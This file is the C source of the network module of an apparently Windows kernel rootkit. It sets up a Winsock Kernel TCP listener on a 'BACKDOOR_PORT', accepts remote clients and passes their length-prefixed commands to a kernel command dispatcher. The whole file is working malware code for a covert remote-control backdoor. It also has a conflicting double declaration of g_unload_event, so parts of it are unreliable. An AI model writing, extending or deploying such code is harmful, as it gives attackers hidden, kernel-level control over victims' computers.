/*==============================================================================
 * rootkit/src/socket.c
 *------------------------------------------------------------------------------
 * WSK (Winsock Kernel) TCP Listener + Per-Client Handler.
 *
 * ARCHITECTURE:
 *   - Runs on a dedicated system thread at PASSIVE_LEVEL
 *   - Accept/Send/Receive use IRPs with completion routines + KEVENT
 *   - Thread blocks on event -> effectively synchronous but IRP-correct
 *   - 1-second accept timeout allows periodic unload flag checking
 *============================================================================*/
#include "../utils.h"
#include <wsk.h>

/*==============================================================================
 * EXTERNAL REFERENCES
 *============================================================================*/
extern NTSTATUS dispatch_command(const UCHAR* in, ULONG in_len,
                                 UCHAR* out, ULONG out_cap, ULONG* out_len);

/*==============================================================================
 * WSK REGISTRATION STATE
 *============================================================================*/
static WSK_REGISTRATION  g_wsk_reg;
static WSK_PROVIDER_NPI  g_wsk_provider;
static WSK_CLIENT_NPI    g_wsk_client;
static BOOLEAN           g_wsk_ready = FALSE;

const WSK_CLIENT_DISPATCH g_wsk_dispatch = {
    MAKE_WSK_VERSION(1, 0), 0, NULL
};

/*==============================================================================
 * UNLOAD SYNCHRONIZATION
 *------------------------------------------------------------------------------
 * g_unload_event is signaled when unload is requested (via CMD_UNLOAD or
 * IOCTL_ROOTKIT_UNLOAD). The listener thread checks this before each accept.
 * Exported for commands.c.
 *============================================================================*/
static KEVENT g_unload_event;
KEVENT g_unload_event;

/*==============================================================================
 * IRP SYNCHRONIZATION HELPERS
 *------------------------------------------------------------------------------
 * Each WSK operation uses a WSK_OP structure with a KEVENT for completion.
 *============================================================================*/
typedef struct _WSK_OP {
    KEVENT   done;
    NTSTATUS status;
    ULONG_PTR info;
} WSK_OP;

static WSK_OP g_accept_op;
static WSK_OP g_send_op;
static WSK_OP g_recv_op;
static WSK_OP g_bind_op;
static WSK_OP g_listen_op;

/*------------------------------------------------------------------------------
 * IRP Completion Routine
 *   Captures status/info and signals the operation's event.
 *   Returns STATUS_MORE_PROCESSING_REQUIRED to keep IRP alive for us.
 *------------------------------------------------------------------------------*/
static NTSTATUS WSKAPI op_completion(PDEVICE_OBJECT dev, PIRP irp, PVOID ctx) {
    UNREFERENCED_PARAMETER(dev);
    WSK_OP* op = (WSK_OP*)ctx;
    op->status = irp->IoStatus.Status;
    op->info   = irp->IoStatus.Information;
    KeSetEvent(&op->done, IO_NO_INCREMENT, FALSE);
    return STATUS_MORE_PROCESSING_REQUIRED;
}

/*------------------------------------------------------------------------------
 * Wait for operation completion with optional timeout.
 *------------------------------------------------------------------------------*/
static NTSTATUS wait_op(WSK_OP* op, PLARGE_INTEGER timeout) {
    KeWaitForSingleObject(&op->done, Executive, KernelMode, FALSE, timeout);
    return op->status;
}

/*------------------------------------------------------------------------------
 * Create WSK_BUF from buffer + allocate MDL.
 *------------------------------------------------------------------------------*/
static WSK_BUF make_wsk_buf(PVOID data, ULONG len, PMDL* out_mdl) {
    PMDL mdl = IoAllocateMdl(data, len, FALSE, FALSE, NULL);
    if (mdl) MmBuildMdlForNonPagedPool(mdl);
    *out_mdl = mdl;
    WSK_BUF buf;
    buf.Offset = 0;
    buf.Length = len;
    buf.Mdl    = mdl;
    return buf;
}

/*==============================================================================
 * WSK WRAPPERS (Synchronous)
 *============================================================================*/

/*------------------------------------------------------------------------------
 * wsk_send_sync - Send data on socket (blocking)
 *------------------------------------------------------------------------------*/
static NTSTATUS wsk_send_sync(PWSK_SOCKET sock, PVOID data, ULONG len) {
    PMDL mdl = NULL;
    WSK_BUF buf = make_wsk_buf(data, len, &mdl);
    if (!mdl) return STATUS_INSUFFICIENT_RESOURCES;

    KeInitializeEvent(&g_send_op.done, NotificationEvent, FALSE);
    PIRP irp = IoAllocateIrp(1, FALSE);
    if (!irp) { IoFreeMdl(mdl); return STATUS_INSUFFICIENT_RESOURCES; }

    IoSetCompletionRoutine(irp, op_completion, &g_send_op, TRUE, TRUE, TRUE);
    NTSTATUS s = g_wsk_provider.Dispatch->WskSend(sock, &buf, 0, irp);
    if (NT_SUCCESS(s)) s = wait_op(&g_send_op, NULL);
    IoFreeIrp(irp);
    IoFreeMdl(mdl);
    return s;
}

/*------------------------------------------------------------------------------
 * wsk_recv_sync - Receive data from socket (blocking)
 *------------------------------------------------------------------------------*/
static NTSTATUS wsk_recv_sync(PWSK_SOCKET sock, PVOID data, ULONG cap, ULONG* got) {
    PMDL mdl = NULL;
    WSK_BUF buf = make_wsk_buf(data, cap, &mdl);
    if (!mdl) return STATUS_INSUFFICIENT_RESOURCES;

    KeInitializeEvent(&g_recv_op.done, NotificationEvent, FALSE);
    PIRP irp = IoAllocateIrp(1, FALSE);
    if (!irp) { IoFreeMdl(mdl); return STATUS_INSUFFICIENT_RESOURCES; }

    IoSetCompletionRoutine(irp, op_completion, &g_recv_op, TRUE, TRUE, TRUE);
    NTSTATUS s = g_wsk_provider.Dispatch->WskReceive(sock, &buf, 0, irp);
    if (NT_SUCCESS(s)) s = wait_op(&g_recv_op, NULL);
    if (NT_SUCCESS(s)) *got = (ULONG)g_recv_op.info;
    IoFreeIrp(irp);
    IoFreeMdl(mdl);
    return s;
}

/*==============================================================================
 * CLIENT HANDLER
 *------------------------------------------------------------------------------
 * Handles a single connected client. Loop:
 *   1. Read 4-byte length prefix (little-endian)
 *   2. Read body (length bytes)
 *   3. Dispatch command
 *   4. Send response (4-byte length + payload)
 *------------------------------------------------------------------------------*/
static VOID handle_client(PWSK_SOCKET client) {
    UCHAR* rbuf = (UCHAR*)rk_alloc(NET_BUF_MAX, POOL_TAG);
    UCHAR* wbuf = (UCHAR*)rk_alloc(NET_BUF_MAX, POOL_TAG);
    if (!rbuf || !wbuf) { rk_free(rbuf, POOL_TAG); rk_free(wbuf, POOL_TAG); return; }

    for (;;) {
        /*--- Read length prefix (4 bytes) ---*/
        ULONG got = 0;
        NTSTATUS s = wsk_recv_sync(client, rbuf, 4, &got);
        if (!NT_SUCCESS(s) || got < 4) break;
        ULONG len = *(U32*)rbuf;
        if (len == 0 || len > NET_BUF_MAX) break;

        /*--- Read body ---*/
        ULONG body_got = 0, total = 0;
        while (total < len) {
            s = wsk_recv_sync(client, rbuf + total, len - total, &body_got);
            if (!NT_SUCCESS(s) || body_got == 0) break;
            total += body_got;
        }
        if (total < len) break;

        /*--- Dispatch command ---*/
        ULONG resp_len = 0;
        s = dispatch_command(rbuf, len, wbuf + 4, NET_BUF_MAX - 4, &resp_len);
        if (!NT_SUCCESS(s)) {
            const char* err = "dispatcher error";
            resp_len = (ULONG)strlen(err);
            RtlCopyMemory(wbuf + 4, err, resp_len);
        }

        /*--- Send response (length + payload) ---*/
        *(U32*)wbuf = resp_len;
        s = wsk_send_sync(client, wbuf, 4 + resp_len);
        if (!NT_SUCCESS(s)) break;
    }

    rk_free(rbuf, POOL_TAG);
    rk_free(wbuf, POOL_TAG);
}

/*==============================================================================
 * LISTENER THREAD (System Thread)
 *------------------------------------------------------------------------------
 * Entry point for the WSK listener system thread.
 * Binds to configured IP/port, accepts connections, spawns handlers.
 *============================================================================*/
VOID listener_thread(PVOID ctx) {
    UNREFERENCED_PARAMETER(ctx);

    /*--- Bind + Listen ---*/
    SOCKADDR_IN addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = RtlUshortByteSwap((USHORT)BACKDOOR_PORT);
    UCHAR ip[4]     = BIND_IP_OCTETS;
    RtlCopyMemory(&addr.sin_addr, ip, 4);

    PWSK_SOCKET listen_sock = NULL;
    NTSTATUS s = g_wsk_provider.Dispatch->WskSocket(
        g_wsk_provider.Client, AF_INET, SOCK_STREAM, IPPROTO_TCP,
        WSK_FLAG_LISTEN_SOCKET, NULL, NULL, NULL, NULL, NULL, &listen_sock);

    if (!NT_SUCCESS(s) || !listen_sock) {
        RK_DBG("WskSocket(listen) failed 0x%08X", s);
        PsTerminateSystemThread(STATUS_UNSUCCESSFUL);
        return;
    }

    s = g_wsk_provider.Dispatch->WskBind(listen_sock, (PSOCKADDR)&addr, 0, NULL);
    if (!NT_SUCCESS(s)) {
        RK_DBG("WskBind failed 0x%08X", s);
        g_wsk_provider.Dispatch->WskCloseSocket(listen_sock, NULL);
        PsTerminateSystemThread(STATUS_UNSUCCESSFUL);
        return;
    }

    s = g_wsk_provider.Dispatch->WskListen(listen_sock, NULL);
    if (!NT_SUCCESS(s)) {
        g_wsk_provider.Dispatch->WskCloseSocket(listen_sock, NULL);
        PsTerminateSystemThread(STATUS_UNSUCCESSFUL);
        return;
    }

    RK_DBG("listening on %u.%u.%u.%u:%u", ip[0], ip[1], ip[2], ip[3], BACKDOOR_PORT);

    /*--- Accept Loop ---*/
    for (;;) {
        /* Check unload flag before blocking on accept. */
        if (KeReadStateEvent(&g_unload_event)) break;

        KeInitializeEvent(&g_accept_op.done, NotificationEvent, FALSE);
        PIRP irp = IoAllocateIrp(1, FALSE);
        if (!irp) break;

        SOCKADDR_IN local = {0}, remote = {0};
        IoSetCompletionRoutine(irp, op_completion, &g_accept_op, TRUE, TRUE, TRUE);
        s = g_wsk_provider.Dispatch->WskAccept(listen_sock, 0, NULL,
                                               (PSOCKADDR)&local, (PSOCKADDR)&remote, irp);

        if (NT_SUCCESS(s)) {
            /* 1-second timeout to allow unload flag checking. */
            LARGE_INTEGER timeout;
            timeout.QuadPart = -10 * 1000 * 1000;  /* -10,000,000 = 1 second */
            s = wait_op(&g_accept_op, &timeout);
        }

        if (s == STATUS_SUCCESS && g_accept_op.info) {
            PWSK_SOCKET client = (PWSK_SOCKET)g_accept_op.info;
            handle_client(client);
            g_wsk_provider.Dispatch->WskCloseSocket(client, NULL);
        } else if (s == STATUS_CANCELLED || s == STATUS_IO_TIMEOUT) {
            IoFreeIrp(irp);
            continue;  /* Timeout - check unload flag and loop */
        } else if (!NT_SUCCESS(s)) {
            IoFreeIrp(irp);
            break;  /* Fatal error - exit thread */
        }
        IoFreeIrp(irp);
    }

    /* Cleanup on exit. */
    g_wsk_provider.Dispatch->WskCloseSocket(listen_sock, NULL);
    PsTerminateSystemThread(STATUS_SUCCESS);
}

/*==============================================================================
 * INIT / DEINIT
 *============================================================================*/

/*------------------------------------------------------------------------------
 * socket_init - Register WSK client, capture provider NPI
 *------------------------------------------------------------------------------*/
NTSTATUS socket_init(VOID) {
    KeInitializeEvent(&g_unload_event, NotificationEvent, FALSE);

    g_wsk_client.ClientContext = NULL;
    g_wsk_client.Dispatch      = &g_wsk_dispatch;

    NTSTATUS s = WskRegister(&g_wsk_client, &g_wsk_reg);
    if (!NT_SUCCESS(s)) return s;

    s = WskCaptureProviderNPI(&g_wsk_reg, WSK_INFINITE_WAIT, &g_wsk_provider);
    if (!NT_SUCCESS(s)) {
        WskDeregister(&g_wsk_reg);
        return s;
    }

    g_wsk_ready = TRUE;
    return STATUS_SUCCESS;
}

/*------------------------------------------------------------------------------
 * socket_deinit - Signal unload, wait briefly, release provider, deregister
 *------------------------------------------------------------------------------*/
VOID socket_deinit(VOID) {
    if (!g_wsk_ready) return;

    KeSetEvent(&g_unload_event, IO_NO_INCREMENT, FALSE);

    /* Give listener thread a moment to observe the flag. */
    LARGE_INTEGER delay; delay.QuadPart = -100 * 1000 * 10;  /* 100 ms */
    KeDelayExecutionThread(KernelMode, FALSE, &delay);

    WskReleaseProviderNPI(&g_wsk_reg);
    WskDeregister(&g_wsk_reg);
    g_wsk_ready = FALSE;
}